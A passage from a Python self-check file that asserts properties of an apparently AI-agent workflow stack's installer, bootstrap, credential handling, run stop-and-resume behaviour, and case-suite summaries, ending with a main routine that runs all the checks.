          decl["novel-reviewer"]["tool_rules"]["write_file"][-1]["action"], "deny")
    # an identity belongs with the thing that names it
    import importlib.util as _il3
    _s3 = _il3.spec_from_file_location("pkg_prin", "/work/stack/packages.py")
    _pk3 = _il3.module_from_spec(_s3); _s3.loader.exec_module(_pk3)
    by_package = _pk3.principals()[0]
    check("a principal a package's workflow names is declared by that package",
          sorted(named - set(by_package)), [])
    check("and the platform's own file holds only what no package owns",
          sorted(set(yaml.safe_load(open("/work/config/principals.yaml", encoding="utf-8"))
                     .get("principals") or {}) & set(by_package)), [])
    check("applying it is part of every bring-up", "principals.py apply" in up, True)
    check("and it runs where a write to Preloop is allowed",
          '"$STACK-admin" /opt/venv/bin/python /work/stack/principals.py apply' in up, True)
    check("a credential is asked about, never assumed from this process's environment",
          "def has_credential(" in src and "os.environ.get(env_name" not in
          src.split("def cmd_apply(")[1].split("def cmd_rules(")[0], True)
    check("and a name that Preloop would refuse is not offered twice",
          "def credential_name(" in src, True)

    # the host, before any of it
    check("the installer checks the compose version the composition needs",
          "2.24" in inst and "env_file" in inst, True)
    check("and says which architecture the image build assumes",
          "x86_64" in inst and "CodexBar" in inst, True)
    check("and changes nothing under --check", "nothing was changed" in inst, True)
    check("the README names the prerequisites rather than implying them",
          "Docker Compose 2.24 or newer" in readme and "x86_64" in readme, True)
    check("and says which choices are the operator's",
          "none of which the script decides for you" in readme, True)
    # An override file is not read when compose is called with -f, which is how every call here
    # names its files. The ports live in Preloop's own file, made instance-aware once.
    check("the installer makes Preloop's own ports this instance's",
          "patch_preloop_ports" in inst and "PRELOOP_API_PORT:-8000" in inst, True)
    check("it keeps what it replaced", "before-agent-stack" in inst, True)
    check("it is idempotent", "already patched" in inst, True)
    check("under --check it writes nothing at all",
          '[ "$CHECK_ONLY" = 1 ] || patch_preloop_ports' in inst, True)
    check("and nothing else publishes those ports",
          "ports:" not in open("/work/docker/preloop.agentstack.yaml", encoding="utf-8").read()
          .split("services:")[1], True)
    check("signing in to a provider is not one of the script's jobs",
          "sign in to any provider" in inst, True)

    # What the cold start found, each one a thing that only shows up on a second machine.
    check("the installer reads the instance it belongs to",
          "config/instance.env" in inst, True)
    check("and tells Preloop's installer where to install",
          "INSTALL_DIR=\"$PRELOOP_DIR\"" in inst, True)
    check("and does not let it create an admin this stack will create itself",
          "PRELOOP_SKIP_ADMIN=1" in inst, True)
    check("a credential already issued is not lost to a failed chmod",
          "except OSError" in src and "chmod" in src, True)
    check("and a minted credential reaches the agent in the same bring-up",
          "restart_needed" in up and "force-recreate agent" in up, True)


def controls_bootstrap():
    print("")
    print("claiming a fresh Preloop — the stack's work, not the operator's")
    import contextlib, importlib.util as il, io
    spec = il.spec_from_file_location("boot_ctl", "/work/stack/bootstrap_preloop.py")
    bp = il.module_from_spec(spec); sys.modules["boot_ctl"] = bp; spec.loader.exec_module(bp)
    src = open("/work/stack/bootstrap_preloop.py", encoding="utf-8").read()
    up = open("/work/scripts/up.sh", encoding="utf-8").read()

    # The sharp edge this guards: on a claimed instance the same call creates a second *account*.
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        code = bp.main(["--api", "http://nowhere:8000"])
    check("it refuses to register without being told the instance is unclaimed", code, 2)
    check("and says why, rather than failing silently",
          "second account" in out.getvalue(), True)
    check("the caller establishes that by counting rows, not by trying",
          'select count(*) from "user"' in up and "--unclaimed" in up, True)
    check("a repeat is declared and guarded", bp.REPEATABLE, "guarded")

    # nothing about the credential is chosen here, and nothing is printed
    check("the password is generated", "secrets.token_urlsafe" in src, True)
    check("and never printed — only the path it went to",
          "password" not in src.split("def main(")[1].split("print(json.dumps(out")[0]
          .replace('"secrets_file"', ""), True)
    check("the file it goes to is not versioned",
          "preloop-owner.env" in open("/work/docker/.gitignore", encoding="utf-8").read(), True)
    check("the address default is one Preloop accepts and that resolves nowhere",
          "owner@agent-stack.internal" in src, True)

    # a claimed instance is not yet a governed one
    check("the policy is applied right after the claim",
          "applying this stack's policy to the new instance" in up, True)
    check("generating reads the logins in the agent, applying writes from the admin side",
          '"$STACK-agent" /opt/venv/bin/python /work/stack/cfg.py generate' in up
          and '"$STACK-admin" /opt/venv/bin/python /work/stack/cfg.py apply' in up, True)


def controls_resume():
    print("")
    print("stopping and continuing — a stop that leaves something to go on from")
    import importlib.util as il, json as _json, pathlib, tempfile
    spec = il.spec_from_file_location("rw_ctl", "/work/stack/run_workflow.py")
    rw = il.module_from_spec(spec); sys.modules["rw_ctl"] = rw; spec.loader.exec_module(rw)
    src = open("/work/stack/run_workflow.py", encoding="utf-8").read()
    up = open("/work/scripts/up.sh", encoding="utf-8").read()
    hub = open("/work/hub/index.html", encoding="utf-8").read()
    ops_server = open("/work/ops/server.py", encoding="utf-8").read()

    check("a run is started with the dashboard that makes a graceful stop possible",
          '"--web", "--web-port", "0"' in src, True)
    check("and the reason is written down, not the feature",
          "checkpoint" in src.split('"--web", "--web-port", "0"')[0][-700:], True)

    # The view, driven with a log that was stopped and then finished — the shape a resume leaves.
    with tempfile.TemporaryDirectory() as tmp:
        root = pathlib.Path(tmp)
        d = root / "u1" / "tmp" / "conductor"
        (d / "checkpoints").mkdir(parents=True)
        (d / "checkpoints" / "c1.json").write_text("{}")
        log = d / "conductor-p281-novel-a-20260101-000000-abcd1234.events.jsonl"
        stopped = {"type": "workflow_failed", "timestamp": 1,
                   "data": {"error_type": "ExecutionError", "message": "stopped by user",
                            "agent_name": "author"}}
        finished = {"type": "workflow_completed", "timestamp": 2,
                    "data": {"output": {"decision": "PASS"}}}
        rw.RUNS = root
        meta = {"ui_id": "u1", "state": "finished", "launcher_pid": 1, "instance": "x"}

        log.write_text(_json.dumps(stopped) + chr(10))
        v = rw.view(dict(meta))
        check("a stopped run reads as stopped", (bool(v["error"]), v["completed_ok"]), (True, False))
        check("and is offered for continuing",
              bool(v["state"] != "running" and not v["completed_ok"] and rw.checkpoints_for("u1")), True)

        log.write_text(_json.dumps(stopped) + chr(10) + _json.dumps(finished) + chr(10))
        v = rw.view(dict(meta))
        check("after the resume it reads as what it became, not what it was",
              (v["error"], v["completed_ok"], (v["output"] or {}).get("decision")),
              (None, True, "PASS"))
        check("and is no longer offered for continuing",
              bool(v["state"] != "running" and not v["completed_ok"]), False)

    # What `--web` cost, and what pays for it: the dashboard outlives the workflow, so waiting for
    # the process to exit waits forever (measured: five launchers asleep half an hour after their
    # runs ended, and a suite whose third case never started).
    check("a run comes back when the workflow ends, not when the process does",
          "def run_conductor(" in src and "proc.terminate()" in src, True)
    check("and a resume looks only past what was already in the log",
          "from_byte" in src, True)
    with tempfile.TemporaryDirectory() as tmp:
        root = pathlib.Path(tmp)
        d = root / "u2" / "tmp" / "conductor"
        d.mkdir(parents=True)
        log = d / "conductor-p281-novel-a-20260101-000000-abcd1234.events.jsonl"
        first = '{"type": "workflow_failed", "data": {}}'
        log.write_text(first + chr(10))
        rw.RUNS = root
        check("the stop that a resume starts from is not read as its end",
              rw.run_ended("u2", len(first) + 1), False)
        check("and what the resume itself writes is", rw.run_ended("u2", 0), True)
    check("our own tidy-up is not reported as the run failing",
          "Reporting -15 as the exit" in src, True)

    check("the panel can continue what it stopped",
          '/api/runs/([a-z0-9-]{6,40})/resume' in ops_server, True)
    check("and does it detached, like a start",
          'run_workflow.py", "resume", m.group(1)], detach=True' in ops_server, True)
    check("the button appears only for a run that can be continued",
          'r.resumable ? `<button class="sub" data-resume=' in hub, True)

    # the reason none of the above reached the running panel until it was found
    check("the bring-up builds the images whose source is this tree",
          "up -d --build" in up, True)

    # Taking the stack down is the other half of stopping a run: the containers must not be
    # pulled out from under one (measured — a run in flight, down.sh, and the checkpoint was there).
    down = open("/work/scripts/down.sh", encoding="utf-8").read()
    check("a run in flight is stopped before the containers are",
          down.index("run_workflow.py stop") < down.index('COMPOSE_PROFILES="record,ui" docker compose'),
          True)
    check("and stopped the way a person would, so it keeps its checkpoint",
          "graceful: it keeps its checkpoint" in down, True)
    check("the wait for it is bounded and reported, not endless",
          "still running; taking the stack down anyway" in down, True)
    check("and --now is there for when that is not wanted", "--now) NOW=1" in down, True)


def controls_suite():
    print("")
    print("a set of cases — running it is ours, saying what it means is not")
    import importlib.util as il, tempfile, pathlib
    spec = il.spec_from_file_location("suite_ctl", "/work/stack/suite.py")
    su = il.module_from_spec(spec); sys.modules["suite_ctl"] = su; spec.loader.exec_module(su)
    src = open("/work/stack/suite.py", encoding="utf-8").read()

    with tempfile.TemporaryDirectory() as tmp:
        f = pathlib.Path(tmp) / "cases.jsonl"
        f.write_text(chr(10).join([
            '{"case": "a", "review_mode": "strict", "max_repairs": 1}',
            '# a comment, and a blank line below',
            '',
            '{"case": "a", "review_mode": "default"}',
            'not json at all',
            '{"case": "UPPER"}',
            '["not", "an", "object"]',
            '{"review_mode": "default"}',
        ]))
        cases, bad = su.read_cases(str(f))
        check("a case's inputs are carried as given, not interpreted",
              [c["inputs"] for c in cases if c["case"] == "c008"], [{"review_mode": "default"}])
        check("a line without a case id still gets one", [c["case"] for c in cases], ["c008"])
        check("a value is passed as text, whatever it was written as",
              su.read_cases(str(f))[0] is not None, True)
        whys = " ".join(b["why"] for b in bad)
        check("a duplicate case id is refused, not silently merged", "share this case id" in whys, True)
        check("a line that is not JSON is named", "not JSON" in whys, True)
        check("so is one that is not an object", "not an object" in whys, True)
        check("and a case id that is not a name", "case id" in whys, True)
        check("nothing unusable is dropped in silence", len(bad), 4)

    check("one run id per case, so a repeat is recognised",
          su.ui_for("s1", "a"), "s1-a")
    check("a case already run is not run again", su.REPEATABLE, "guarded")

    # the summary is execution fact and says so
    rows = [{"decision": "PASS", "model_calls": 2, "tokens": 10, "wall_ms": 1000,
             "permission_requests": 2, "decided_by_rules": 2, "approvals_requested": 0,
             "rule_denials": 0, "retries": 0, "loop": {"rounds": 1, "bound": 1, "within": True},
             "assertions": {"reached_a_terminal_step": True, "recorded": True,
                            "every_call_had_a_principal": True, "loop_within_bound": True}},
            {"decision": "BLOCK", "model_calls": 3, "tokens": 20, "wall_ms": 2000,
             "permission_requests": 1, "decided_by_rules": 0, "approvals_requested": 1,
             "rule_denials": 1, "retries": 1, "loop": {"rounds": 2, "bound": 1, "within": False},
             "assertions": {"reached_a_terminal_step": True, "recorded": False,
                            "every_call_had_a_principal": None, "loop_within_bound": False}}]
    s2 = su.summarise(rows)
    check("the set's cost is summed", (s2["model_calls"], s2["tokens"]), (5, 30))
    check("a rule deciding is still not a person being asked",
          (s2["decided_by_rules"], s2["asked_a_person"]), (2, 1))
    check("loops are counted against their own bounds",
          (s2["loops_within_bound"], s2["loops_measured"]), (1, 2))
    check("a run that was not recorded is not counted as one", s2["recorded"], 1)
    check("how the runs ended is a tally", s2["ended_as"], {"BLOCK": 1, "PASS": 1})
    check("and it is labelled as the workflow's word, not a grade",
          "not a grade" in src, True)

    # What the first suite found: a login file can exist while its token is dead, and then every
    # run that needs that provider holds while the bring-up still reports the login as present.
    oh = open("/work/stack/ops_health.py", encoding="utf-8").read()
    up_sh = open("/work/scripts/up.sh", encoding="utf-8").read()
    check("a provider the stack cannot read is a standing risk",
          "the stack cannot tell what" in oh, True)
    check("being at a limit is not one", "not a risk" in oh, True)
    check("and the bring-up checks it where a run would meet it",
          'state is knowable' in up_sh and 'every provider' in up_sh, True)
    # The words appear in the file's own docstring, where they are disclaimed. What matters is
    # that they are absent from the code: a summary that computed one of these would be grading.
    body = src.split(chr(34) * 3, 2)[2]
    for word in ("accuracy", "score", "correct", "expected", "label"):
        check(f"nothing in the code computes {word}", word in body.lower(), False)


if __name__ == "__main__":
    controls_role_egress()
    controls_review_findings()
    controls_package_sources()
    controls_retry()
    controls_packages()
    controls_docs()
    controls_template()
    controls_suite()
    controls_resume()
    controls_bootstrap()
    controls_approval_boundary()
    controls_boundary()
    controls_chains()
    controls_running()
    controls_trajectory()
    controls_evidence()
    controls_repeat()
    controls_step_rights()
    controls_panel()
    controls_composition()
    controls_recorder()
    controls_triage()
    controls_reviews_step()
    controls_lanes_step()
    controls_lanes()
    controls_roles()
    controls_record_and_screen()
    print(f"\n{len(PASS)}/{len(PASS) + len(FAIL)} controls passed")
    sys.exit(1 if FAIL else 0)
